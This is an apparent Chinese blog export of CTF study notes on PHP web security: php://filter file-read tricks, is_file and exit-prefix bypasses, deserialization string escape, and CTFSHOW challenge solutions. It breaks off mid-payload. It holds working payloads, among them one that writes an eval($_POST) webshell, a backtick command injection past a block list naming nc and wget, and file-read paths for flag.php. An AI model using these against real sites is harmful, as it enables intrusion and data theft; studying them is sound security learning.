post\nhttp协议默认先以get方式获取数据，无论是否以哪种方式发起的，总是get方式优先，即通过get方式获取到了数据就不会再去通过post方式获取一遍，如果get方式获取不到，再以post方式获取。\n\nReflectionClass反射类\n可以和system连用：Reflectionclass(system(&#39;cat ls&#39;));\n\n&lt;?phpclass A&#123;public static $flag=&quot;flag&#123;123123123&#125;&quot;;const  PI=3.14;static function hello()&#123;    echo &quot;hello&lt;/br&gt;&quot;;&#125;&#125;$a=new ReflectionClass(&#x27;A&#x27;);var_dump($a-&gt;getConstants());  //获取一组常量输出 array(1) &#123;  [&quot;PI&quot;]=&gt;  float(3.14)&#125;var_dump($a-&gt;getName());    //获取类名输出string(1) &quot;A&quot;var_dump($a-&gt;getStaticProperties()); //获取静态属性输出array(1) &#123;  [&quot;flag&quot;]=&gt;  string(15) &quot;flag&#123;123123123&#125;&quot;&#125;var_dump($a-&gt;getMethods()); //获取类中的方法输出array(1) &#123;  [0]=&gt;  object(ReflectionMethod)#2 (2) &#123;    [&quot;name&quot;]=&gt;    string(5) &quot;hello&quot;    [&quot;class&quot;]=&gt;    string(1) &quot;A&quot;  &#125;&#125;\n\ncall_user_func回调函数\ncall_user_func(callback,parameter)：callback：被调用的回调函数，其余参数是回调函数的参数，尝试用hex2bin()作为回调函数（16进制转化为ASCII 字符）\ncall_user_func()来调用一个类里面的方法\ncall_user_func(array($classname, &#39;say_hello&#39;));将调用$calssname类里面的say_hello的方法\n\n\n\nPHP伪协议写文件\n配合file_put_contents(v3,str);函数 //在需要base64转换的时候\n\nv3=php://filter/write=convert.base64-decode/resource=1.php&amp;str=......\n\n读文件function filter($file)&#123;    if(preg_match(&#x27;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;        die(&quot;hacker!&quot;);    &#125;else&#123;        return $file;    &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;\n\n\n通常使用：\n\nphp://filter/read=convert.base64-encode/resource=flag.php\n\n当ban掉base64的时候，我们还可以用其他编码方式（或者不编码）：\n\nphp://filter/resource=flag.php\t\tphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.phpphp://filter/read=convert.quoted-printable-encode/resource=flag.php\t//可打印字符引用编码compress.zlib://flag.php\t\t//压缩流\n\nis_file()函数\n判断是否为文件\n\nphp伪协议绕过\nhighlight_file()可以识别php伪协议 is_file()不能识别php伪协议\n\n/proc/self/root\n在linux中/proc/self/root是指向根目录的 也就是如果在命令行中输入 ls /proc/self/root其实显示的内容是根目录下的内容多次重复后绕过is_file\n\nfile=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\nereg()截断漏洞if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;    die(&#x27;error&#x27;);&#125;if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;    echo $flag;&#125;\n\npayload: c=a%00778    反转后：c=877=0x36d\n\nstrrev()：反转字符串，常出现在%00截断漏洞中注：%00是一个整体，不会反转成00% \n\nException异常处理类\n和ReflectionClass反射类用法相似，该类中常用的成员函数如下所示：\n\ngetMessage()：返回异常的消息内容；getCode()：以数字形式返回异常代码；getFile()：返回发生异常的文件名；getLine()：返回发生错误的代码行号；getTrace()：返回 backtrace() 数组；getTraceAsString()：返回已格式化成字符串的、由函数 getTrace() 函数所产生的信息；__toString()：产生异常的字符串信息，它可以重载。注意，该函数最前部是两个下划线。\n\nFilesystemIterator类读取文件\nFilesystemIterator获取指定目录下的所有文件\ngetcwd()函数：获取当前工作目录 返回当前工作目录\n\nFilesystemIterator(getcwd());\nPHP变量$_SERVERecho $_SERVER[&#x27;PHP_SELF&#x27;].&quot;&lt;br&gt;&quot;;//当前运行的文件echo $_SERVER[&#x27;SERVER_ADDR&#x27;].&quot;&lt;br&gt;&quot;;//本地地址echo $_SERVER[&#x27;SERVER_NAME&#x27;].&quot;&lt;br&gt;&quot;;//所在服务器的主机名echo $_SERVER[&#x27;SERVER_PROTOCOL&#x27;].&quot;&lt;br&gt;&quot;;//请求页面时HTTP(通信协议)的名称和版本echo $_SERVER[&#x27;REQUEST_METHOD&#x27;].&quot;&lt;br&gt;&quot;;//访问页面使用的请求方法echo $_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&quot;&lt;br&gt;&quot;;//运行文件的所在目录（绝对路径）echo $_SERVER[&#x27;HTTP_ACCEPT_LANGUAGE&#x27;].&quot;&lt;br&gt;&quot;;//当前请求头中 Accept-Languageecho $_SERVER[&#x27;SCRIPT_FILENAME&#x27;].&quot;&lt;br&gt;&quot;;//运行文件的文件名（绝对路径）echo $_SERVER[&#x27;SCRIPT_NAME&#x27;];//当前运行的脚本的文件、echo $_SERVER[&#x27;REQUEST_URI&#x27;];//URI 用来指定要访问的页面。1，http://localhost/aaa/ (打开aaa中的index.php)结果：$_SERVER[&#x27;QUERY_STRING&#x27;] = &quot;&quot;;$_SERVER[&#x27;REQUEST_URI&#x27;] = &quot;/aaa/&quot;;$_SERVER[&#x27;SCRIPT_NAME&#x27;] = &quot;/aaa/index.php&quot;;$_SERVER[&#x27;PHP_SELF&#x27;] = &quot;/aaa/index.php&quot;;2，http://localhost/aaa/?p=222 (附带查询)结果：$_SERVER[&#x27;QUERY_STRING&#x27;] = &quot;p=222&quot;;$_SERVER[&#x27;REQUEST_URI&#x27;] = &quot;/aaa/?p=222&quot;;$_SERVER[&#x27;SCRIPT_NAME&#x27;] = &quot;/aaa/index.php&quot;;$_SERVER[&#x27;PHP_SELF&#x27;] = &quot;/aaa/index.php&quot;;3，http://localhost/aaa/index.php?p=222&amp;q=333结果：$_SERVER[&#x27;QUERY_STRING&#x27;] = &quot;p=222&amp;q=333&quot;;$_SERVER[&#x27;REQUEST_URI&#x27;] = &quot;/aaa/index.php?p=222&amp;q=333&quot;;$_SERVER[&#x27;SCRIPT_NAME&#x27;] = &quot;/aaa/index.php&quot;;$_SERVER[&#x27;PHP_SELF&#x27;] = &quot;/aaa/index.php&quot;;由实例可知：$_SERVER[&quot;QUERY_STRING&quot;] 获取查询 语句，实例中可知，获取的是?后面的值$_SERVER[&quot;REQUEST_URI&quot;] 获取 http://localhost 后面的值，包括/$_SERVER[&quot;SCRIPT_NAME&quot;] 获取当前脚本的路径，如：index.php$_SERVER[&quot;PHP_SELF&quot;] 当前正在执行脚本的文件名\n\n\n$_SERVER[&#39;argv&#39;]\n$argv：传递给脚本的参数数组\n\n\n网页模式下：$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]\n\n\nCLI模式下直接把 request info ⾥⾯的argv值复制到arr数组中去继续判断query string是否为空，如果不为空把通过+符号分割的字符串转换成php内部的zend_string，然后再把这个zend_string复制到 arr 数组中去。\n\n$GLOBALS\n储存全局作用域中的变量\n\nfunction getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 = &amp;$$v2;&quot;);//$v1和$v2指向同一地址，此时$v1=$v2    var_dump($$v1);&#125;\n\npayload: v1=ctfshow&amp;v2=GLOBALS  //构成$GLOBALS\nget_defined_vars()\n返回由所有已定义变量所组成的数组\n变量包括环境变量、服务器变量和用户定义的变量\n\nvar_dump(get_defined_vars())\n变量命名\nPHP变量命名规则：只能包含：字母、数字、下划线其中，只能以字母、下划线开头\n\nif(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;\nphp变量命名不允许出现 .（点号）,需要绕过’CTF_SHOW.COM’\nGET或POST方式传进去的变量名,会自动将空格 + . [转换为 _\n特殊字符[, GET或POST方式传参时,变量名中的[也会被替换为_,但其后的字符就不会被替换了 因此：\nCTF[SHOW.COM =&gt; CTF_SHOW.COM\ndie()和exit()死亡绕过&lt;?php$filename=$_GET[&#x27;filename&#x27;];$content=$_GET[&#x27;content&#x27;];file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);\n\nPHP在解码base64时，遇到不在其中的字符时，会选择跳过这些字符，将有效的字符重新组成字符串进行解码\n由于死亡之exit中的代码，字符&lt;、?、;、&gt;、空格等字符不符合base64解码范围，最终解码符合要求的只有phpexit这7个字符，而base64在解码的时候，是4个字节一组，因此还少一个，所以我们将这一个添加上去\n\nbase64编码绕过：\n\n?filename=php://filter/convert.base64-decode/resource=1.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==\n变量覆盖什么是变量覆盖？\n\n用我们的传参值替换程序原有的变量值\n\n常见场景：\n\n$$使用不当\nextract()函数使用不当\nparse_str()使用不当\nimport_request_variables()使用不当\n开启全局变量\n……\n\n$$与foreach()\n$$就是将之前定义的变量的值重新定义新的变量\n\n$a=b$b=c    $$a = $($a) = $b = c\n\n\nforeach()：循环用于列举出集合中所有的元素（是集合不是数组）\naddslashes()：使用反斜线引用字符串\n\n$a=1;foreach (array(&#x27;_COOKIE&#x27;,&#x27;_POST&#x27;,&#x27;_GET&#x27;)as $_request)&#123;    foreach ($$_request as $_key=&gt;$_value)&#123;        $$_key=addslashes($_value);    &#125;&#125;echo $a;当我以get方式传入a=2时，输出结果为2\n\nextract()\nextract(array,extract_rules,prefix) ：将数组中的变量导入到当前的符号表\narray：必需的，规定要使用的数组\nextract_rules：可有可无，如果为空，则默认为EXTR_OVERWRITE\n\n\n\n&lt;?php$a=&quot;1&quot;;$my_array=array(&quot;a&quot;=&gt;&quot;Cat&quot;,&quot;b&quot;=&gt;&quot;Dog&quot;,&quot;c&quot;=&gt;&quot;Horse&quot;);extract($my_array);echo &quot;\\$a=$a,\\$b=$b,\\$c=$c&quot;;结果：$a=Cat,$b=Dog,$c=Horse\n\nparse_str()\n把查询字符串解析到变量中\n\n$str = &quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;;// 推荐用法parse_str($str, $output);echo $output[&#x27;first&#x27;];  // valueecho $output[&#x27;arr&#x27;][0]; // foo barecho $output[&#x27;arr&#x27;][1]; // baz// 不建议这么用parse_str($str);echo $first;  // valueecho $arr[0]; // foo barecho $arr[1]; // baz\n\n\n若要post参数，需加引号v1=&#39;flag=0&#39;\nparse_str(string $encoded_string [, array &amp;$result ])\n如果存在第二个变量，变量会以数组元素的形式存入到这个数组，作为替代\n\n\n\n\n经过parse_str($_SERVER[‘QUERY_STRING’]) ==&gt; $_POST[key1]=36d 数组形式经过extract($_POST)==&gt; $key=36d\n\nassert()断言assert() 断言：PHP 5bool assert ( mixed $assertion [, string $description ] )PHP 7bool assert ( mixed $assertion [, Throwable $exception ] )如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行可见，eval和assert都可以将字符当作代码执行，只不过assert不需要严格遵从语法，比如语句末尾的分号可不加\n\ngettext拓展在开启该拓展后 _() 等效于 gettext()\necho gettext(&quot;phpinfo&quot;); 结果  phpinfoecho _(&quot;phpinfo&quot;); 结果 phpinfo \n\nshell_exec()if($F = @$_GET[&#x27;F&#x27;])&#123;    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123;        eval(substr($F,0,6));    &#125;\n\n套娃命令执行：\nget传参   F=`$F `;sleep 3经过substr($F,0,6)截取后 得到  `$F `;也就是会执行 eval(&quot;`$F `;&quot;);我们把原来的$F带进去eval(&quot;``$F `;sleep 3`&quot;); //``是shell_exec()函数的缩写前面的命令我们不需要管，但是后面的命令我们可以自由控制。\n\nnl、cp、mv、tee写文件在禁命令的时候没有限制写文件：\nnl flag.php&gt;1.txtcp flag.php&gt;1.txtmv flag.php&gt;1.txt\n\ntee命令\n\nLinux tee命令用于读取标准输入的数据，并将其内容输出成文件\ntee file1 file2：复制文件\nls /|tee 1.txt：命令输出\n\n","categories":["网络安全"],"tags":["web安全"]},{"title":"PHP反序列化","url":"/post/8ac6c1a1.html","content":"\n\n简介\n序列化其实就是将数据转化成一种可逆的数据结构，逆向的过程就叫做反序列化。\nphp 将数据序列化和反序列化会用到两个函数\n\n\nserialize 将对象格式化成有序的字符串\nunserialize 将字符串还原成原来的对象\n\n\n常见的序列化格式\n\n二进制格式\n\n字节数组\n\njson字符串\n\nxml字符串\n\n\n\n\n序列化class TEST &#123;    public $data;    public $data2 = &quot;dazzhuang&quot;;    private $pass;    public function __construct($data, $pass)    &#123;        $this-&gt;data = $data;        $this-&gt;pass = $pass;    &#125;&#125;$number = 34;$str = &#x27;user&#x27;;$bool = true;$null = NULL;$arr = array(&#x27;a&#x27; =&gt; 10, &#x27;b&#x27; =&gt; 200);$test = new TEST(&#x27;uu&#x27;, true);$test2 = new TEST(&#x27;uu&#x27;, true);$test2-&gt;data = &amp;$test2-&gt;data2;echo serialize($number).&quot;&lt;br /&gt;&quot;;echo serialize($str).&quot;&lt;br /&gt;&quot;;echo serialize($bool).&quot;&lt;br /&gt;&quot;;echo serialize($null).&quot;&lt;br /&gt;&quot;;echo serialize($arr).&quot;&lt;br /&gt;&quot;;echo serialize($test).&quot;&lt;br /&gt;&quot;;echo serialize($test2).&quot;&lt;br /&gt;&quot;;\n\n输出结果i:34;\t//int 整型s:4:&quot;user&quot;;\t//字符串型b:1;\t//boolN;\t//null空a:2:&#123;s:1:&quot;a&quot;;i:10;s:1:&quot;b&quot;;i:200;&#125;\t//array 数组O:4:&quot;TEST&quot;:3:\t\t&#123;s:4:&quot;data&quot;;s:2:&quot;uu&quot;;s:5:&quot;data2&quot;;s:9:&quot;dazzhuang&quot;;s:10:&quot;TESTpass&quot;;b:1;&#125;O:4:&quot;TEST&quot;:3:&#123;s:4:&quot;data&quot;;s:9:&quot;dazzhuang&quot;;s:5:&quot;data2&quot;;R:2;s:10:&quot;TESTpass&quot;;b:1;&#125;\t//Object 对象\n\n表达方式\n字符串：s : 内容长度 : “内容”\n数组：a : 参数数量 : {内容1 ; 内容2 ; 内容3……}\n对象：O : 类名长度 : 类名 : 变量数量 : {内容1 ; 内容2 ; 内容3……}内容：变量类型 : 变量名字长度 : “变量名字” ; 值的类型 : 值的长度 : 值;\n%00是url编码后的空格private私有属性序列化时，在变量名前加&quot;%00类名%00&quot;protected受保护属性序列化时在变量名前加&quot;%00*%00&quot;\n\n反序列化\n反序列化之后的内容为一个对象\n反序列化生成的对象里的值，由反序列化里的值提供，与原有类定义的值无关\n反序列化不触发类的成员方法，需要调用方法后才能触发\n\n魔术方法什么是魔术方法\n一个预定义好的，在特定情况下自动触发的行为方法\n\n魔术方法的作用\n反序列化漏洞的成因\n反序列化过程中，unserialize()接受的值（字符串）可控\n通过更改这个值（字符串），得到所需要的代码\n通过调用方法，触发代码执行\n\n\n\n\n魔术方法在特定条件下自动调用相关方法，最终导致触发代码\n\n相关函数\n_construct()：类的构建函数\n_destruct()：类的析构函数\n_call()：在对象中调用一个不可以访问方法时调用\n_callStatic()：用静态方式中调用一个不可以访问方法时调用\n_get()：获得一个类的成员变量时调用\n_isset()：当对不可访问属性调用isset()或empty()时调用\n_set()：设置一个类的成员变量时调用\n_unset()：当对不可访问属性调用unset()时被调用\n_sleep()：执行serialize()时，先会调用这个函数\n_wakeup()：执行unserialize()时，先会调用这个函数\n_toString()：类被当成字符串时的回应方法\n_invoke()：调用函数的方式调用一个对象时的回应方法\n_set_state()：调用var_export()导出类时，此静态方法被调用\n_clone()：当对象复制完成时调用\n_autoload()：尝试加载未定义的类\n_debugInfo()：打印所需调试信息\n\n函数详解__construct()\n构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法\n\nclass User &#123;    public $username;    public function __construct($username) &#123;        $this-&gt;username = $username;        echo &quot;触发了构造函数1次&quot; ;    &#125;&#125;$test = new User(&quot;benben&quot;);$ser = serialize($test);unserialize($ser);输出结果：    触发了构造函数1次\n\n\n实例化对象时触发构造函数_construct()\n\n__destruct()\n析构函数，在对象的所有引用被删除或者当对象被显示销毁时执行的魔术方法\n\nclass User &#123;    public function __destruct()    &#123;        echo &quot;触发了析构函数1次&quot;.&quot;&lt;br /&gt;&quot; ;    &#125;&#125;$test = new User(&quot;benben&quot;);$ser = serialize($test);unserialize($ser);输出结果：    触发了析构函数1次    触发了析构函数1次\n\n\n实例化对象结束后，代码运行完全销毁，触发析构函数_destruct()\n反序列化得到的是对象，用完后会销毁，会触发析构函数_destruct()\n\n__sleep\n序列化serialize()函数会检查类中是否存在一个魔术方法_sleep()如果存在，该方法会先被调用，然后才执行序列化操作\n此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组如果该方法未返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误\n\n\n触发时机：序列化serialize()之前\n功能：对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性\n参数：成员属性\n返回值：需要被序列化存储的成员属性 \n\nclass User &#123;    const SITE = &#x27;uusama&#x27;;    public $username;    public $nickname;    private $password;    public function __construct($username, $nickname, $password)    &#123;        $this-&gt;username = $username;        $this-&gt;nickname = $nickname;        $this-&gt;password = $password;    &#125;    public function __sleep() &#123;        return array(&#x27;username&#x27;, &#x27;nickname&#x27;);    &#125;&#125;$user = new User(&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;);echo serialize($user);输出结果：    O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;\n\n\nserialize()只序列化sleep返回的变量\n\n__wakeup()\nunserialize()会检查是否存在一个_wakeup()方法如果存在，则会先调用_wakep()方法，预先准备对象需要的资源\n预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始操作\n\nclass User &#123;    const SITE = &#x27;uusama&#x27;;    public $username;    public $nickname;    private $password;    private $order;    public function __wakeup() &#123;        $this-&gt;password = $this-&gt;username;    &#125;&#125;$user_ser = &#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;;var_dump(unserialize($user_ser));输出结果：    object(User)#1 (4) &#123; [&quot;username&quot;]=&gt; string(1) &quot;a&quot; [&quot;nickname&quot;]=&gt; string(1) &quot;b&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(1) &quot;a&quot; [&quot;order&quot;:&quot;User&quot;:private]=&gt; NULL &#125;\n\n\n_wakeup()在反序列化unserialize()之前\n_destruct()在反序列化unserialize()之后\n\n__toString()\n表达方式错误导致魔术方法触发\n触发时机：把对象当作字符串调用\n\n\n常用于构造POP链接\n\nclass User &#123;    var $benben = &quot;this is test!!&quot;;         public function __toString()         &#123;             return &#x27;格式不对，输出不了!&#x27;;          &#125;&#125;$test = new User() ;print_r($test);echo &quot;&lt;br /&gt;&quot;;echo $test;输出结果：    User Object ( [benben] =&gt; this is test!! )\t格式不对，输出不了!\n\n__invoke()\n格式表达错误导致魔术方法触发\n触发时机：把对象当成函数调用\n\n\n\nclass User &#123;    var $benben = &quot;this is test!!&quot;;         public function __invoke()         &#123;             echo  &#x27;它不是个函数!&#x27;;          &#125;&#125;$test = new User() ;echo $test -&gt;benben;echo &quot;&lt;br /&gt;&quot;;echo $test() -&gt;benben;输出结果：    this is test!!\t它不是个函数!\n\n__call()\n触发时机：调用一个不存在的方法。\n返回值：调用的不存在的方法的名称和参数\n\nclass User &#123;    public function __call($arg1,$arg2)    &#123;        echo &quot;$arg1,$arg2[0]&quot;;          &#125;&#125;$test = new User() ;$test -&gt; callxxx(&#x27;a&#x27;);输出结果：    callxxx,a\n\n__callStatic()\n触发时机：静态调用或调用成员常量时使用的方法不存在\n返回值：调用的不存在的方法的名称和参数\n\nclass User &#123;    public function __callStatic($arg1,$arg2)    &#123;        echo &quot;$arg1,$arg2[0]&quot;;          &#125;&#125;$test = new User() ;$test::callxxx(&#x27;a&#x27;);输出结果：    callxxx,a\n\n__get()\n触发时机：调用的成员属性不存在\n返回值：不存在的成员属性的名称\n\nerror_reporting(0);class User &#123;    public $var1;    public function __get($arg1)    &#123;        echo  $arg1;    &#125;&#125;$test = new User() ;$test -&gt;var2;输出结果：    var2\n\n__set()\n触发时机：给不存在的成员属性赋值\n返回值：不存在的成员属性的名称和赋的值\n\nclass User &#123;    public $var1;    public function __set($arg1 ,$arg2)    &#123;        echo  $arg1.&#x27;,&#x27;.$arg2;    &#125;&#125;$test = new User() ;$test -&gt;var2=1;输出结果：    var2,1\n\n__isset()\n触发时机：对不可访问属性使用isset()或empty()时，_isset()会被调用\n返回值：不存在的成员属性的名称\n\nclass User &#123;    private $var;    public function __isset($arg1 )    &#123;        echo  $arg1;    &#125;&#125;$test = new User() ;isset($test-&gt;var);输出结果；    var\n\n__unset()\n触发时机：对不可访问属性使用unset()时\n返回值：不存在的成员属性的名称\n\nclass User &#123;    private $var;    public function __unset($arg1 )    &#123;        echo  $arg1;    &#125;&#125;$test = new User() ;unset($test-&gt;var);输出结果：    var\n\n__clone()\n触发时机：当使用clone关键字拷贝完成一对象后，新对象会自动调用定义的魔术方法_clone()\n\nclass User &#123;    private $var;    public function __clone( )    &#123;        echo  &quot;__clone test&quot;;          &#125;&#125;$test = new User() ;$newclass = clone($test)    输出结果：    __clone test\n\n字符串逃逸前置知识\n反序列化分隔符\n\n反序列化以;&#125;结束，后面的字符串不影响正常的反序列化\n\n属性逃逸\n\n一般在数据先经过一次serialize在经过unserialize，在这个中间反序列化的字符串变多或者变少的时候可能存在反序列化属性逃逸\n字符减少class A&#123;    public $v1 = &quot;abcsystem()system()system()&quot;;    public $v2 = &#x27;123&#x27;;    public function __construct($arga,$argc)&#123;            $this-&gt;v1 = $arga;            $this-&gt;v2 = $argc;    &#125;&#125;$a = $_GET[&#x27;v1&#x27;];$b = $_GET[&#x27;v2&#x27;];$data = serialize(new A($a,$b));$data = str_replace(&quot;system()&quot;,&quot;&quot;,$data);var_dump(unserialize($data));输出结果    object(A)#1 (2) &#123; [&quot;v1&quot;]=&gt; NULL [&quot;v2&quot;]=&gt; NULL &#125;\n\n例：利用字符串逃逸，通过字符减少的方式，使结果增加一个变量v3，其值为666\n创建对象后的$data值：O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abcsystem()system()system()&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;\n通过str_replace处理后的值：O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;\n/* 变量的值是由其前面的长度控制的，在处理后的值中，system()被替换为空，导致v1值的长度和前面对不上，在反序列化中就不会成功。 所以我们需要控制v2的数据内容，来创造一个v3的值为666，且要将v1的数据长度和内容相匹配。 在构造时要注意用;&#125;提前闭合，数据内容和长度要匹配。 理论成功，实践开始。*//*  - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;  观察上述字符串发现v1值长度为27，但是其真正的内容只有abc，所以会继续吞掉后面的数据直到27位为止。 而我们要恶意构造的内容在v2中，不妨直接将v2的值与前面分离，便于观察 - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;    123&quot;;&#125;  因为我们要创建一个v3的值为666，通过改变v2的值来实现，所以将v2的值123替换为$v3=&quot;666&quot;的序列化内容,且要将序列化内容提前闭合 - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;    ;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;&quot;;&#125;  发现v2改完之后的长度为21，因为v1数据长度为27，这个是无法改变的，通过上一步计算得到v2数据的长度是个两位数，发现到构造v2数据之前的v1的值长度为19，所以我们需要将其补全为27。 - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:xx:&quot;1234567&quot;    ;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;&quot;;&#125;  将v2内容计算长度，补充完整 - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:29:&quot;1234567&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;&quot;;&#125;  此时v1，v2的值都确认下来了 - v1 = abcsystem()system()system() - v2 = 1234567&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;*/    //将上述的值传参进去，发现变量v3成功逃逸出来了object(A)#1 (3) &#123; [&quot;v1&quot;]=&gt; string(27) &quot;abc&quot;;s:2:&quot;v2&quot;;s:29:&quot;1234567&quot; [&quot;v2&quot;]=&gt; string(3) &quot;123&quot; [&quot;v3&quot;]=&gt; string(3) &quot;666&quot; &#125;\n\n字符增加class A&#123;    public $v1 = &#x27;ls&#x27;;    public $v2 = &#x27;123&#x27;;    public function __construct($arga,$argc)&#123;        $this-&gt;v1 = $arga;        $this-&gt;v2 = $argc;    &#125;&#125;$a = $_GET[&#x27;v1&#x27;];$b = $_GET[&#x27;v2&#x27;];$data =  serialize(new A($a,$b));$data = str_replace(&quot;ls&quot;,&quot;pwd&quot;,$data);var_dump(unserialize($data));输出结果    object(A)#1 (2) &#123; [&quot;v1&quot;]=&gt; NULL [&quot;v2&quot;]=&gt; NULL &#125;\n\n例：利用字符串逃逸，通过字符增加的方式，使结果增加一个变量v3，其值为666\n/* 观察代码发现每有一个ls，就会被替换pwd，从而使长度错误，不能执行反序列化。 我们可以将需要创造的变量写成序列化的值，将位数计算出来，通过多个ls将位数补齐，使其与替换后的长度相同。 因为此处需要操作的只有一个变量v1，所以不需要管v2的值 理论成功，实践开始。*//* - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:2:&quot;pwd&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125; 观察上述代码发现，v1数据长度与实际长度不匹配，所以我们需要让它把我们需要的长度吐出来，从而构建我们所需要的代码。  构建需要创建的变量值：因为不需要考虑v2的值，所以我们构造完成后就可以利用;&#125;结束反序列化，又因为，我们要将序列化内容单独拿出来使其逃逸，所以用&quot;;隔断 - &quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;  计算发现上述内容长度为22，ls是两位，替换后变成pwd是三位，所以会吐出来一位，我们需要22位，所以需要22个ls加上上述序列化内容，其长度等于替换后的22个pwd的长度，于是，v3的值就逃逸出来 - lslslslslslslslslslslslslslslslslslslslslsls&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125; - 替换前的: O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:66:&quot;lslslslslslslslslslslslslslslslslslslslslsls&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125; - 替换后的： O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:66:&quot;pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125; 可以发现，v3的值成功逃逸出来了  - v1=lslslslslslslslslslslslslslslslslslslslslsls&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125; - v2=任意值*///将上述的值传参进去，发现变量v3成功逃逸出来了object(A)#1 (3) &#123; [&quot;v1&quot;]=&gt; string(66) &quot;pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd&quot; [&quot;v2&quot;]=&gt; string(3) &quot;123&quot; [&quot;v3&quot;]=&gt; string(3) &quot;666&quot; &#125;\n\n","categories":["网络安全"],"tags":["web安全"]},{"title":"CTFSHOW-WEB入门","url":"/post/87b124cd.html","content":"\n\nPHP特性web89(intval)if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num))&#123;        echo $flag;    &#125;&#125;\n\npayload: ?num[]=1\n\npreg_match()：只能处理字符串，当传入的是数组时会返回false\nintval()：变量不能是array和object格式  成功时返回var的integer值，失败时返回0，空的array返回0，非空的array返回1\n\nweb90(强比较)if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;\n\npayload: ?num=4476[a-z or .!@$%^\\()等]\n\nintval()：如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。如果字符串第一个是 - ，则从第二个开始算起\n===：在进行比较的时候，会先判断两种字符串的类型是否相等，再比较\n\nweb91(正则-m)$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;        echo &#x27;hacker&#x27;;    &#125;    else&#123;        echo $flag;    &#125;&#125;else&#123;    echo &#x27;no no no no no&#x27;;&#125;\n\npayload: 